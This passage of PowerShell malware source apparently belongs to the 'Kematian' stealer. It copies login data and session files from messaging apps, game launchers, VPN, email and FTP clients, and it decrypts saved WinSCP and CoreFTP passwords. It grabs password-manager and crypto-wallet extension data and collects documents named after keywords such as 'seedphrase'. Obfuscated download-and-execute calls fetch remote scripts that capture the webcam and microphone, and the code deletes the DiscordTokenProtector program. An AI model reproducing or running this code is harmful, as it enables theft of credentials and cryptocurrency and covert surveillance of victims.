        $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
        if (!(Test-Path $pidgin_folder)) { return }
        $pidgin_accounts = "$folder_messaging\Pidgin"
        New-Item -ItemType Directory -Force -Path $pidgin_accounts | Out-Null
        Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
    }
    pidgin_stealer
    
    # Tox 
    function tox_stealer {
        $tox_folder = "$env:appdata\Tox"
        if (!(Test-Path $tox_folder)) { return }
        $tox_session = "$folder_messaging\Tox"
        New-Item -ItemType Directory -Force -Path $tox_session | Out-Null
        Get-ChildItem -Path "$tox_folder" |  Copy-Item -Destination $tox_session -Recurse -Force
    }
    tox_stealer

    #----------------#
    #  GAMING        #
    #----------------#
    
    # Steam 
    function steamstealer {
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        if (!(Test-Path $steamfolder)) { return }
        $steam_session = "$folder_gaming\Steam"
        New-Item -ItemType Directory -Force -Path $steam_session | Out-Null
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach ($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
    }
    steamstealer

    # Minecraft 
    function minecraftstealer {
        $minecraft_session = "$folder_gaming\Minecraft"
        New-Item -ItemType Directory -Force -Path $minecraft_session | Out-Null
        $minecraft_paths = @{
            "Minecraft" = @{
                "Intent"          = Join-Path $env:userprofile "intentlauncher\launcherconfig"
                "Lunar"           = Join-Path $env:userprofile ".lunarclient\settings\game\accounts.json"
                "TLauncher"       = Join-Path $env:userprofile "AppData\Roaming\.minecraft\TlauncherProfiles.json"
                "Feather"         = Join-Path $env:userprofile "AppData\Roaming\.feather\accounts.json"
                "Meteor"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\meteor-client\accounts.nbt"
                "Impact"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Impact\alts.json"
                "Novoline"        = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Novoline\alts.novo"
                "CheatBreakers"   = Join-Path $env:userprofile "AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
                "Microsoft Store" = Join-Path $env:userprofile "AppData\Roaming\.minecraft\launcher_accounts_microsoft_store.json"
                "Rise"            = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Rise\alts.txt"
                "Rise (Intent)"   = Join-Path $env:userprofile "intentlauncher\Rise\alts.txt"
                "Paladium"        = Join-Path $env:userprofile "AppData\Roaming\paladium-group\accounts.json"
                "PolyMC"          = Join-Path $env:userprofile "AppData\Roaming\PolyMC\accounts.json"
                "Badlion"         = Join-Path $env:userprofile "AppData\Roaming\Badlion Client\accounts.json"
            }
        } 
        foreach ($launcher in $minecraft_paths.Keys) {
            foreach ($pathName in $minecraft_paths[$launcher].Keys) {
                $sourcePath = $minecraft_paths[$launcher][$pathName]
                if (Test-Path $sourcePath) {
                    $destination = Join-Path -Path $minecraft_session -ChildPath $pathName
                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
                    Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
                }
            }
        }
    }
    minecraftstealer

    # Epicgames 
    function epicgames_stealer {
        $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
        if (!(Test-Path $epicgamesfolder)) { return }
        $epicgames_session = "$folder_gaming\EpicGames"
        New-Item -ItemType Directory -Force -Path $epicgames_session | Out-Null
        Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
    }
    epicgames_stealer

    # Ubisoft 
    function ubisoftstealer {
        $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
        if (!(Test-Path $ubisoftfolder)) { return }
        $ubisoft_session = "$folder_gaming\Ubisoft"
        New-Item -ItemType Directory -Force -Path $ubisoft_session | Out-Null
        Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
    }
    ubisoftstealer

    # EA 
    function electronic_arts {
        $eafolder = "$env:localappdata\Electronic Arts\EA Desktop\CEF"
        if (!(Test-Path $eafolder)) { return }
        $ea_session = "$folder_gaming\Electronic Arts"
        New-Item -ItemType Directory -Path $ea_session -Force | Out-Null
        $parentDirName = (Get-Item $eafolder).Parent.Name
        $destination = Join-Path $ea_session $parentDirName
        New-Item -ItemType Directory -Path $destination -Force | Out-Null
        Copy-Item -Path $eafolder -Destination $destination -Recurse -Force
    }
    electronic_arts

    # Growtopia 
    function growtopiastealer {
        $growtopiafolder = "$env:localappdata\Growtopia"
        if (!(Test-Path $growtopiafolder)) { return }
        $growtopia_session = "$folder_gaming\Growtopia"
        New-Item -ItemType Directory -Force -Path $growtopia_session | Out-Null
        $save_file = "$growtopiafolder\save.dat"
        if (Test-Path $save_file) { Copy-Item -Path $save_file -Destination $growtopia_session } 
    }
    growtopiastealer

    # Battle.net
    function battle_net_stealer {
        $battle_folder = "$env:appdata\Battle.net"
        if (!(Test-Path $battle_folder)) { return }
        $battle_session = "$folder_gaming\Battle.net"
        New-Item -ItemType Directory -Force -Path $battle_session | Out-Null
        $files = Get-ChildItem -Path $battle_folder -File -Recurse -Include "*.db", "*.config" 
        foreach ($file in $files) {
            Copy-Item -Path $file.FullName -Destination $battle_session
        }
    }
    battle_net_stealer

    #-------------------#
    #  VPN CLIENTS      #
    #-------------------#

    # ProtonVPN
    function protonvpnstealer {   
        $protonvpnfolder = "$env:localappdata\protonvpn"  
        if (!(Test-Path $protonvpnfolder)) { return }
        $protonvpn_account = "$folder_vpn\ProtonVPN"
        New-Item -ItemType Directory -Force -Path $protonvpn_account | Out-Null
        $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
    }
    protonvpnstealer


    #Surfshark VPN
    function surfsharkvpnstealer {
        $surfsharkvpnfolder = "$env:appdata\Surfshark"
        if (!(Test-Path $surfsharkvpnfolder)) { return }
        $surfsharkvpn_account = "$folder_vpn\Surfshark"
        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account | Out-Null
        Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
    }
    surfsharkvpnstealer
    
    # OpenVPN 
    function openvpn_stealer {
        $openvpnfolder = "$env:userprofile\AppData\Roaming\OpenVPN Connect"
        if (!(Test-Path $openvpnfolder)) { return }
        $openvpn_accounts = "$folder_vpn\OpenVPN"
        New-Item -ItemType Directory -Force -Path $openvpn_accounts | Out-Null
        Copy-Item -Path "$openvpnfolder\profiles" -Destination $openvpn_accounts -Recurse -force 
        Copy-Item -Path "$openvpnfolder\config.json" -Destination $openvpn_accounts -Recurse -force 
    }
    openvpn_stealer
    
	#------------------------#
	#  EMAIL CLIENTS         #
	#------------------------#
	
    # Thunderbird 
    function thunderbirdbackup {
        $thunderbirdfolder = "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles"
        if (!(Test-Path $thunderbirdfolder)) { return }
        $thunderbirdbackup = "$folder_email\Thunderbird"
        New-Item -ItemType Directory -Force -Path $thunderbirdbackup | Out-Null
        $pattern = "^[a-z0-9]+\.default-esr$"
        $directories = Get-ChildItem -Path $thunderbirdfolder -Directory | Where-Object { $_.Name -match $pattern }
        $filter = @("key4.db", "key3.db", "logins.json", "cert9.db", "*.js")
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $thunderbirdbackup -ChildPath $directory.Name
            New-Item -ItemType Directory -Force -Path $destinationPath | Out-Null
            foreach ($filePattern in $filter) {
                Get-ChildItem -Path $directory.FullName -Recurse -Filter $filePattern -File | ForEach-Object {
                    $relativePath = $_.FullName.Substring($directory.FullName.Length).TrimStart('\')
                    $destFilePath = Join-Path -Path $destinationPath -ChildPath $relativePath
                    $destFileDir = Split-Path -Path $destFilePath -Parent
                    if (!(Test-Path -Path $destFileDir)) {
                        New-Item -ItemType Directory -Force -Path $destFileDir | Out-Null
                    }
                    Copy-Item -Path $_.FullName -Destination $destFilePath -Force
                }
            }
        }
    }
    thunderbirdbackup
	
    # MailBird
    function mailbird_backup {
        $mailbird_folder = "$env:localappdata\MailBird"
        if (!(Test-Path $mailbird_folder)) { return }
        $mailbird_db = "$folder_email\MailBird"
        New-Item -ItemType Directory -Force -Path $mailbird_db | Out-Null
        Copy-Item -Path "$mailbird_folder\Store\Store.db" -Destination $mailbird_db -Recurse -force
    } 
    mailbird_backup

    #-------------------#
    #  FTP CLIENTS      #
    #-------------------#

    # Filezilla 
    function filezilla_stealer {
        $FileZillafolder = "$env:appdata\FileZilla"
        if (!(Test-Path $FileZillafolder)) { return }
        $filezilla_hosts = "$ftp_clients\FileZilla"
        New-Item -ItemType Directory -Force -Path $filezilla_hosts | Out-Null
        $recentServersXml = Join-Path -Path $FileZillafolder -ChildPath 'recentservers.xml'
        $siteManagerXml = Join-Path -Path $FileZillafolder -ChildPath 'sitemanager.xml'
        function ParseServerInfo {
            param ([string]$xmlContent)
            $matches = [regex]::Match($xmlContent, "<Host>(.*?)</Host>.*<Port>(.*?)</Port>")
            $serverHost = $matches.Groups[1].Value
            $serverPort = $matches.Groups[2].Value
            $serverUser = [regex]::Match($xmlContent, "<User>(.*?)</User>").Groups[1].Value
            # Check if both User and Pass are blank
            if ([string]::IsNullOrWhiteSpace($serverUser)) { return "Host: $serverHost `nPort: $serverPort`n" }
            # if User is not blank, continue with authentication details
            $encodedPass = [regex]::Match($xmlContent, "<Pass encoding=`"base64`">(.*?)</Pass>").Groups[1].Value
            $decodedPass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPass))
            return "Host: $serverHost `nPort: $serverPort `nUser: $serverUser `nPass: $decodedPass`n"
        }       
        $serversInfo = @()
        foreach ($xmlFile in @($recentServersXml, $siteManagerXml)) {
            if (Test-Path $xmlFile) {
                $xmlContent = Get-Content -Path $xmlFile
                $servers = [System.Collections.ArrayList]@()
                $xmlContent | Select-String -Pattern "<Server>" -Context 0, 10 | ForEach-Object {
                    $serverInfo = ParseServerInfo -xmlContent $_.Context.PostContext
                    $servers.Add($serverInfo) | Out-Null
                }
                $serversInfo += $servers -join "`n"
            }
        }
        $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
        Write-Host "[!] Filezilla Session information saved" -ForegroundColor Green
    }
    filezilla_stealer
	
    #  WinSCP  
    function Get-WinSCPSessions {
        $registryPath = "SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
        $winscp_session = "$ftp_clients\WinSCP"
        New-Item -ItemType Directory -Force -Path $winscp_session | Out-Null
        $outputPath = "$winscp_session\WinSCP-sessions.txt"
        $output = "WinSCP Sessions`n`n"
        $hive = [UInt32] "2147483649" # HKEY_CURRENT_USER
        function Get-RegistryValue {
            param ([string]$subKey, [string]$valueName)
            $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name GetStringValue -ArgumentList $hive, $subKey, $valueName
            return $result.sValue
        }
        function Get-RegistrySubKeys {
            param ([string]$subKey)
            $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name EnumKey -ArgumentList $hive, $subKey
            return $result.sNames
        }
        $sessionKeys = Get-RegistrySubKeys -subKey $registryPath
        if ($null -eq $sessionKeys) {
            Write-Host "[!] Failed to enumerate registry keys under $registryPath" -ForegroundColor Red
            return
        }
        function DecryptNextCharacterWinSCP {
            param ([string]$remainingPass)
            $Magic = 163
            $flagAndPass = "" | Select-Object -Property flag, remainingPass
            $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
            $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
            $Added = $firstval + $secondval
            $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
            $flagAndPass.flag = $decryptedResult
            $flagAndPass.remainingPass = $remainingPass.Substring(2)
            return $flagAndPass
        }
        function DecryptWinSCPPassword {
            param ([string]$SessionHostname, [string]$SessionUsername, [string]$Password)
            $CheckFlag = 255
            $Magic = 163
            $key = $SessionHostname + $SessionUsername
            $values = DecryptNextCharacterWinSCP -remainingPass $Password
            $storedFlag = $values.flag
            if ($values.flag -eq $CheckFlag) {
                $values.remainingPass = $values.remainingPass.Substring(2)
                $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
            }
            $len = $values.flag
            $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
            $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
            $finalOutput = ""
            for ($i = 0; $i -lt $len; $i++) {
                $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
                $finalOutput += [char]$values.flag
            }
            if ($storedFlag -eq $CheckFlag) {
                return $finalOutput.Substring($key.Length)
            }
            return $finalOutput
        }
        foreach ($sessionKey in $sessionKeys) {
            $sessionName = $sessionKey
            $sessionPath = "$registryPath\$sessionName"
            $hostname = Get-RegistryValue -subKey $sessionPath -valueName "HostName"
            $username = Get-RegistryValue -subKey $sessionPath -valueName "UserName"
            $encryptedPassword = Get-RegistryValue -subKey $sessionPath -valueName "Password"
            if ($encryptedPassword) {
                $password = DecryptWinSCPPassword -SessionHostname $hostname -SessionUsername $username -Password $encryptedPassword
            }
            else {
                $password = "No password saved"
            }
            $output += "Session  : $sessionName`n"
            $output += "Hostname : $hostname`n"
            $output += "Username : $username`n"
            $output += "Password : $password`n`n"
        }
        $output | Out-File -FilePath $outputPath
        Write-Host "[!] WinSCP Session information saved" -ForegroundColor Green
    }
    Get-WinSCPSessions
	
    # coreftp
    function CoreFTP_backup {
    $coreftp = "$ftp_clients\CoreFTP"
    New-Item -ItemType Directory -Force -Path $coreftp | Out-Null
    function Decrypt-String {
        param ([string]$hexString)
        $hexString = $hexString -replace '\s', ''
        $byteArray = @()
        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
            $byteArray += [System.Convert]::ToByte($hexString.Substring($i, 2), 16)
        }
        $key = [System.Text.Encoding]::ASCII.GetBytes("hdfzpysvpzimorhk")
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
        $decryptor = $aes.CreateDecryptor()
        $decryptedBytes = $decryptor.TransformFinalBlock($byteArray, 0, $byteArray.Length)
        $aes.Dispose()
        $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)
        return $decryptedString
    }

    function Get-RegistryValues {
        $regPath = 'HKCU:\Software\FTPware\CoreFTP\Sites'
        if (Test-Path $regPath) {
            $profiles = Get-ChildItem -Path $regPath -ErrorAction SilentlyContinue
            $output = "[CoreFTP]`n`n"
            foreach ($profile in $profiles) {
                $profileKey = Get-Item -LiteralPath $profile.PSPath -ErrorAction SilentlyContinue
                $profileValues = Get-ItemProperty -Path $profile.PSPath -ErrorAction SilentlyContinue
                $values = @{
                    Host = $profileValues.Host
                    Port = $profileValues.Port
                    User = $profileValues.User
                    Password = "N/A"
                }
                if ($profileValues.PW) {
                    try {
                        $values.Password = Decrypt-String -hexString $profileValues.PW
                    } catch {
                        Write-Host "[!] ERROR: Failed to decrypt password: $_"
                    }
                }
                if ($values) {
                    $output += "Host: $($values.Host)`n"
                    $output += "Port: $($values.Port)`n"
                    $output += "Username: $($values.User)`n"
                    $output += "Password: $($values.Password)`n"
                    $output += "`n"
                }
            }
            return $output
        } else {
            return $null
        }
    }

    try {
        $results = Get-RegistryValues
        if ($results) {
            $results | Out-File -FilePath "$coreftp\coreftp.txt" -Encoding UTF8
            Write-Host "[!] CoreFTP passwords saved to $coreftp" -ForegroundColor Green
        } else {
            Write-Host "[!] No CoreFTP profiles found." -ForegroundColor Red
        }
         } catch {
        Write-Host "[!] INFO: CoreFTP not installed or failed to retrieve registry values" -ForegroundColor Red
        }
    }
    CoreFTP_backup
	
    # smartftp
    function smartftp_backup {
    $sourceDir = "$env:appdata\SmartFTP\Client 2.0\"
    $SmartFTP_dir = "$ftp_clients\SmartFTP"
	New-Item -ItemType Directory -Force -Path $SmartFTP_dir | Out-Null
    if (Test-Path -Path $sourceDir) {
        Get-ChildItem $sourceDir -Include @("*.dat","*.xml") -EA Ignore -Recurse | Copy-Item -Destination $SmartFTP_dir
        Write-Host "[!] SmartFTP files have been copied to $SmartFTP_dir" -ForegroundColor Green
    } else {
        Write-Host "[!] Source directory not found: $sourceDir" -ForegroundColor Red
        }
    }
    smartftp_backup


    #------------------------#
    #  PASSWORD MANAGERS     #
    #------------------------#
    function password_managers {
        $browserPaths = @{
            "Brave"       = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
            "Chrome"      = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
            "Chromium"    = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
            "Edge"        = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
            "EpicPrivacy" = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
            "Iridium"     = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
            "Opera"       = Join-Path $env:APPDATA "Opera Software\Opera Stable"
            "OperaGX"     = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
            "Vivaldi"     = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
            "Yandex"      = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
        }
        $password_mgr_dirs = @{
            "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"
            "aeblfdkhhhdcdjpifhhbdiojplfjncoa" = "1Password"                  
            "eiaeiblijfjekdanodkjadfinkhbfgcd" = "NordPass" 
            "fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane" 
            "nngceckbapebfimnlniiiahkandclblb" = "Bitwarden" 
            "pnlccmojcmeohlpggmfnbbiapkmbliob" = "RoboForm" 
            "bfogiafebfohielmmehodmfbbebbbpei" = "Keeper" 
            "cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword" 
            "oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC" 
            "hdokiejnpimakedhajhdlcegeplioahd" = "LastPass" 
        }
        foreach ($browser in $browserPaths.GetEnumerator()) {
            $browserName = $browser.Key
            $browserPath = $browser.Value
            if (Test-Path $browserPath) {
                Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
                    $localExtensionsSettingsDir = $_.FullName
                    foreach ($password_mgr_dir in $password_mgr_dirs.GetEnumerator()) {
                        $passwordmgrkey = $password_mgr_dir.Key
                        $password_manager = $password_mgr_dir.Value
                        $extentionPath = Join-Path $localExtensionsSettingsDir $passwordmgrkey
                        if (Test-Path $extentionPath) {
                            if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
                                try {
                                    $password_mgr_browser = "$password_manager ($browserName)"
                                    $password_dir_path = Join-Path $password_managers $password_mgr_browser
                                    New-Item -ItemType Directory -Path $password_dir_path -Force | out-null
                                    Copy-Item -Path $extentionPath -Destination $password_dir_path -Recurse -Force
                                    $locationFile = Join-Path $password_dir_path "Location.txt"
                                    $extentionPath | Out-File -FilePath $locationFile -Force
                                    Write-Host "[!] Copied $password_manager from $extentionPath to $password_dir_path" -ForegroundColor Green
                                }
                                catch {
                                    Write-Host "[!] Failed to copy $password_manager from $extentionPath" -ForegroundColor Red
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    password_managers

    #----------------------------------------#
    #  CRYPTO WALLETS (desktop and browser)  #
    #----------------------------------------#
    function Local_Crypto_Wallets {
        $wallet_paths = @{
            "Local Wallets" = @{
                "Armory"           = Join-Path $env:appdata      "\Armory\*.wallet"
                "Atomic"           = Join-Path $env:appdata      "\Atomic\Local Storage\leveldb"
                "Bitcoin"          = Join-Path $env:appdata      "\Bitcoin\wallets"
                "Bytecoin"         = Join-Path $env:appdata      "\bytecoin\*.wallet"
                "Coinomi"          = Join-Path $env:localappdata "Coinomi\Coinomi\wallets"
                "Dash"             = Join-Path $env:appdata      "\DashCore\wallets"
                "Electrum"         = Join-Path $env:appdata      "\Electrum\wallets"
                "Ethereum"         = Join-Path $env:appdata      "\Ethereum\keystore"
                "Exodus"           = Join-Path $env:appdata      "\Exodus\exodus.wallet"
                "Guarda"           = Join-Path $env:appdata      "\Guarda\Local Storage\leveldb"
                "com.liberty.jaxx" = Join-Path $env:appdata      "\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
                "Litecoin"         = Join-Path $env:appdata      "\Litecoin\wallets"
                "MyMonero"         = Join-Path $env:appdata      "\MyMonero\*.mmdb"
                "Monero GUI"       = Join-Path $env:appdata      "Documents\Monero\wallets\"
	        "WalletWasabi"     = Join-Path $env:appdata      "WalletWasabi\Client\Wallets"
            }
        }
        $zephyr_path = "$env:appdata\Zephyr\wallets"
        New-Item -ItemType Directory -Path "$folder_crypto\Zephyr" -Force | Out-Null
        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force }	
        foreach ($wallet in $wallet_paths.Keys) {
            foreach ($pathName in $wallet_paths[$wallet].Keys) {
                $sourcePath = $wallet_paths[$wallet][$pathName]
                if (Test-Path $sourcePath) {
                    $destination = Join-Path -Path $folder_crypto -ChildPath $pathName
                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
                    Copy-Item -Path $sourcePath -Recurse -Destination $destination -Force
                }
            }
        }
    }
    Local_Crypto_Wallets
	
    function browserwallets {
        $browserPaths = @{
            "Brave"       = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
            "Chrome"      = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
            "Chromium"    = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
            "Edge"        = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
            "EpicPrivacy" = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
            "Iridium"     = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
            "Opera"       = Join-Path $env:APPDATA "Opera Software\Opera Stable"
            "OperaGX"     = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
            "Vivaldi"     = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
            "Yandex"      = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
        }
        $walletDirs = @{
            "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
            "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
            "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep Wallet"
            "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
            "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
            "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
            "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
            "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
            "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
            "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
            "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
            "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
            "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
            "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
            "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
            "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
            "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
            "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
            "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
            "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
            "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
            "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
            "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
            "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
            "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"       
        }
        foreach ($browser in $browserPaths.GetEnumerator()) {
            $browserName = $browser.Key
            $browserPath = $browser.Value
            if (Test-Path $browserPath) {
                Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
                    $localExtensionsSettingsDir = $_.FullName
                    foreach ($walletDir in $walletDirs.GetEnumerator()) {
                        $walletKey = $walletDir.Key
                        $walletName = $walletDir.Value
                        $extentionPath = Join-Path $localExtensionsSettingsDir $walletKey
                        if (Test-Path $extentionPath) {
                            if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
                                try {
                                    $wallet_browser = "$walletName ($browserName)"
                                    $walletDirPath = Join-Path $folder_crypto $wallet_browser
                                    New-Item -ItemType Directory -Path $walletDirPath -Force | out-null
                                    Copy-Item -Path $extentionPath -Destination $walletDirPath -Recurse -Force
                                    $locationFile = Join-Path $walletDirPath "Location.txt"
                                    $extentionPath | Out-File -FilePath $locationFile -Force
                                    Write-Host "[!] Copied $walletName wallet from $extentionPath to $walletDirPath" -ForegroundColor Green
                                }
                                catch {
                                    Write-Host "[!] Failed to copy $walletName wallet from $extentionPath" -ForegroundColor Red
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    browserwallets
 
	
    Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
    
    #-------------------#
    #  FILE GRABBER     #
    #-------------------#
    function FilesGrabber {
        $item_limit = 100
        $allowedExtensions = @("*.jpg", "*.png", "*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
        $keywords = @("2fa", "acc", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "proton", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
        $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
        foreach ($path in $paths) {
            $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
                $_.Length -lt 1mb -and $_.Name -match ($keywords -join '|')
            } | Select-Object -First $item_limit
            foreach ($file in $files) {
                $destination = Join-Path -Path $important_files -ChildPath $file.Name
                if ($file.FullName -ne $destination) {
                    Copy-Item -Path $file.FullName -Destination $destination -Force
                }
            }
        }
        # Send info about the keywords that match a grabbed file
        $keywordsUsed = @()
        foreach ($keyword in $keywords) {
            foreach ($file in (Get-ChildItem -Path $important_files -Recurse)) {
                if ($file.Name -like "*$keyword*") {
                    if ($file.Length -lt 1mb) {
                        if ($keywordsUsed -notcontains $keyword) {
                            $keywordsUsed += $keyword
                            $keywordsUsed | Out-File "$folder_general\Important_Files_Keywords.txt" -Force
                        }
                    }
                }
            }
        }
    }
    FilesGrabber

    Set-Location "$env:LOCALAPPDATA\Temp"

    # webcam 
    if ($webcam) {
        Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
        $webcam = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/webcam.ps1")
        $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
        $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
        $invokewebcam.WaitForExit()
        $webcam_image = "$env:temp\webcam.png"
        if (Test-Path -Path $webcam_image) {
            Move-Item -Path $webcam_image -Destination $folder_general
            Write-Host "[!] The webcam image moved successfully to $folder_general" -ForegroundColor Green
        } else {
            Write-Host "[!] The webcam image does not exist." -ForegroundColor Red
        }
    }

    # record mic for 10 sec
    if ($record_mic) {
        Write-Host "[!] Recording PC MIC for 10 seconds" -ForegroundColor Green
        $mic = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/mic.ps1")
        $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$mic')"
        $invokemic = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
        $invokemic.WaitForExit()
        $mic_file = "$env:temp\mic.wav"
        if (Test-Path -Path $mic_file) {
            Move-Item -Path $mic_file -Destination $folder_general
            Write-Host "[!] The mic.wav file moved successfully to $folder_general" -ForegroundColor Green
        } else {
            Write-Host "[!] The mic.wav file does not exist." -ForegroundColor Red
        }
    }

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force -ErrorAction 'SilentlyContinue'
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force -ErrorAction 'SilentlyContinue'
    }

